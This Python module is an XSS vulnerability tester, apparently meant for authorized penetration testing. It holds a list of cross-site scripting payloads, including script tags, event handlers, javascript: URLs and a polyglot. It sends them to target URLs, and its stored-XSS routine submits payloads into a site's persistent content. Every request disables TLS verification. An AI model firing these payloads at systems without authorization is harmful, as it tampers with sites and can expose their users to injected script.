"""
Cross-Site Scripting (XSS) Testing Module

IMPORTANT: This tool should only be used for:
- Authorized penetration testing engagements
- Security research in controlled environments
- Educational purposes
- Testing your own systems or systems with explicit written permission

Unauthorized use is illegal and unethical.
"""

import logging
import requests
import re
import urllib.parse
from typing import Dict, Any, List
from bs4 import BeautifulSoup

logger = logging.getLogger(__name__)


class SimpleXSSTester:
    """
    Simple XSS vulnerability tester.
    Tests for reflected and stored XSS vulnerabilities using various payloads.
    """

    def __init__(self):
        self.timeout = 10
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'RedTeam-XSSTest/1.0'
        })

        # XSS payloads for different contexts
        self.default_payloads = [
            # Basic script injection
            "<script>alert('XSS')</script>",
            "<script>alert(1)</script>",

            # Event handlers
            "<img src=x onerror=alert('XSS')>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert('XSS')>",
            "<svg/onload=alert(1)>",
            "<body onload=alert('XSS')>",

            # JavaScript protocol
            "<iframe src=javascript:alert('XSS')>",
            "<a href=javascript:alert('XSS')>click</a>",

            # Breaking out of attributes
            "' onmouseover='alert(1)'",
            '" onmouseover="alert(1)"',
            "'-alert(1)-'",
            '"-alert(1)-"',

            # HTML injection
            "<h1>XSS_TEST</h1>",
            "<div>XSS_MARKER</div>",

            # Polyglot payloads
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//\\x3e",
        ]

    def test_xss(self, target_url: str, method: str = 'GET',
                 parameter: str = None, custom_payload: str = None,
                 test_all_payloads: bool = False) -> Dict[str, Any]:
        """
        Test a target URL for XSS vulnerabilities.

        Args:
            target_url: The target URL to test
            method: HTTP method (GET or POST)
            parameter: Optional specific parameter to test
            custom_payload: Optional custom XSS payload
            test_all_payloads: If True, test all default payloads

        Returns:
            Dictionary with test results
        """
        logger.warning(f"Testing XSS on: {target_url}")

        # Determine payloads to test
        if custom_payload:
            payloads = [custom_payload]
        elif test_all_payloads:
            payloads = self.default_payloads
        else:
            # Test a subset of effective payloads
            payloads = self.default_payloads[:5]

        vulnerabilities_found = []
        tests_performed = []

        for payload in payloads:
            try:
                result = self._test_single_payload(
                    target_url=target_url,
                    method=method,
                    parameter=parameter,
                    payload=payload
                )

                tests_performed.append({
                    "payload": payload,
                    "status": result.get("status"),
                    "vulnerable": result.get("vulnerable", False)
                })

                if result.get("vulnerable"):
                    vulnerabilities_found.append(result)

                    # If not testing all payloads, stop at first vulnerability
                    if not test_all_payloads:
                        break

            except Exception as e:
                logger.error(f"Error testing XSS payload '{payload}': {str(e)}")
                tests_performed.append({
                    "payload": payload,
                    "status": "error",
                    "error": str(e)
                })
                continue

        # Compile final results
        if vulnerabilities_found:
            return {
                "status": "success",
                "message": f"XSS vulnerability detected - {len(vulnerabilities_found)} payload(s) successful",
                "vulnerable": True,
                "details": {
                    "target_url": target_url,
                    "method": method,
                    "parameter": parameter,
                    "vulnerabilities": vulnerabilities_found,
                    "total_tests": len(tests_performed),
                    "successful_payloads": len(vulnerabilities_found)
                }
            }
        else:
            return {
                "status": "not_vulnerable",
                "message": "No XSS vulnerabilities detected",
                "vulnerable": False,
                "details": {
                    "target_url": target_url,
                    "method": method,
                    "parameter": parameter,
                    "total_tests": len(tests_performed),
                    "note": "Payloads were not reflected or were properly encoded"
                }
            }

    def _test_single_payload(self, target_url: str, method: str,
                            parameter: str, payload: str) -> Dict[str, Any]:
        """Test a single XSS payload against the target."""

        try:
            # Send request with payload
            if method.upper() == 'GET':
                if parameter:
                    response = self.session.get(
                        target_url,
                        params={parameter: payload},
                        timeout=self.timeout,
                        verify=False
                    )
                else:
                    # Append to URL
                    separator = '&' if '?' in target_url else '?'
                    test_url = f"{target_url}{separator}test={urllib.parse.quote(payload)}"
                    response = self.session.get(
                        test_url,
                        timeout=self.timeout,
                        verify=False
                    )
            else:
                data = {parameter: payload} if parameter else {'input': payload}
                response = self.session.post(
                    target_url,
                    data=data,
                    timeout=self.timeout,
                    verify=False
                )

            # Check if payload is reflected
            vulnerable, context = self._check_payload_reflection(
                response.text,
                payload
            )

            if vulnerable:
                return {
                    "status": "vulnerable",
                    "vulnerable": True,
                    "payload_used": payload,
                    "reflection_context": context,
                    "response_status": response.status_code,
                    "evidence": f"Payload reflected in {context} context"
                }
            else:
                return {
                    "status": "not_reflected",
                    "vulnerable": False,
                    "payload_used": payload,
                    "response_status": response.status_code
                }

        except requests.exceptions.Timeout:
            return {
                "status": "timeout",
                "vulnerable": False,
                "payload_used": payload,
                "error": "Request timed out"
            }

        except requests.exceptions.RequestException as e:
            return {
                "status": "error",
                "vulnerable": False,
                "payload_used": payload,
                "error": str(e)
            }

    def _check_payload_reflection(self, response_text: str,
                                  payload: str) -> tuple[bool, str]:
        """
        Check if payload is reflected in response and determine context.

        Returns:
            Tuple of (is_vulnerable, context_description)
        """
        # Check for exact payload reflection
        if payload in response_text:
            # Parse HTML to determine context
            try:
                soup = BeautifulSoup(response_text, 'html.parser')

                # Check if in script tag
                scripts = soup.find_all('script')
                for script in scripts:
                    if payload in str(script):
                        return (True, "script tag")

                # Check if in dangerous tags (img, svg, iframe, etc.)
                dangerous_tags = ['img', 'svg', 'iframe', 'body', 'div', 'input', 'a']
                for tag_name in dangerous_tags:
                    tags = soup.find_all(tag_name)
                    for tag in tags:
                        tag_str = str(tag)
                        if payload in tag_str:
                            # Check if it's in an event handler attribute
                            if any(attr.startswith('on') for attr in tag.attrs):
                                return (True, f"{tag_name} tag with event handler")
                            # Check if in src/href
                            if 'src' in tag.attrs and payload in str(tag.get('src', '')):
                                return (True, f"{tag_name} src attribute")
                            if 'href' in tag.attrs and payload in str(tag.get('href', '')):
                                return (True, f"{tag_name} href attribute")
                            return (True, f"{tag_name} tag")

                # Check if payload created new HTML elements
                if '<' in payload and '>' in payload:
                    # Extract tag name from payload
                    tag_match = re.search(r'<(\w+)', payload)
                    if tag_match:
                        tag_name = tag_match.group(1)
                        if soup.find(tag_name):
                            return (True, f"injected {tag_name} tag")

                # Payload reflected but in safe context
                return (True, "HTML content (potentially safe)")

            except Exception as e:
                logger.error(f"Error parsing HTML: {e}")
                # If we can't parse, but payload is there, assume vulnerable
                return (True, "unknown context")

        # Check for URL-encoded version
        encoded_payload = urllib.parse.quote(payload)
        if encoded_payload in response_text:
            return (False, "URL-encoded (safe)")

        # Check for HTML-encoded version (safe)
        html_encoded = payload.replace('<', '&lt;').replace('>', '&gt;')
        if html_encoded in response_text:
            return (False, "HTML-encoded (safe)")

        # Check for partial reflection (might indicate filtering)
        payload_parts = re.findall(r'\w+', payload)
        if len(payload_parts) > 0:
            if all(part in response_text for part in payload_parts):
                return (False, "partially reflected (filtered)")

        return (False, "not reflected")

    def test_stored_xss(self, target_url: str, submit_url: str,
                       view_url: str, parameter: str,
                       payload: str = None) -> Dict[str, Any]:
        """
        Test for stored XSS vulnerabilities.

        Args:
            target_url: Base URL
            submit_url: URL to submit payload (POST)
            view_url: URL where stored content is displayed
            parameter: Parameter name for payload
            payload: XSS payload to test

        Returns:
            Dictionary with test results
        """
        logger.warning(f"Testing stored XSS: submit={submit_url}, view={view_url}")

        payload = payload or "<script>alert('STORED_XSS')</script>"

        try:
            # Step 1: Submit the payload
            submit_data = {parameter: payload}
            submit_response = self.session.post(
                submit_url,
                data=submit_data,
                timeout=self.timeout,
                verify=False
            )

            if submit_response.status_code not in [200, 201, 302]:
                return {
                    "status": "error",
                    "message": f"Failed to submit payload (status: {submit_response.status_code})",
                    "vulnerable": False
                }

            # Step 2: View the page where content is stored
            view_response = self.session.get(
                view_url,
                timeout=self.timeout,
                verify=False
            )

            # Step 3: Check if payload is reflected
            vulnerable, context = self._check_payload_reflection(
                view_response.text,
                payload
            )

            if vulnerable:
                return {
                    "status": "success",
                    "message": "Stored XSS vulnerability detected",
                    "vulnerable": True,
                    "details": {
                        "vulnerability_type": "Stored XSS",
                        "submit_url": submit_url,
                        "view_url": view_url,
                        "parameter": parameter,
                        "payload_used": payload,
                        "reflection_context": context,
                        "severity": "High",
                        "evidence": f"Payload stored and reflected in {context}"
                    }
                }
            else:
                return {
                    "status": "not_vulnerable",
                    "message": "No stored XSS detected",
                    "vulnerable": False,
                    "details": {
                        "submit_url": submit_url,
                        "view_url": view_url,
                        "note": "Payload was not reflected or was properly encoded"
                    }
                }

        except Exception as e:
            logger.error(f"Error testing stored XSS: {str(e)}")
            return {
                "status": "error",
                "message": f"Error during stored XSS test: {str(e)}",
                "vulnerable": None
            }

    def close(self):
        """Clean up resources"""
        self.session.close()
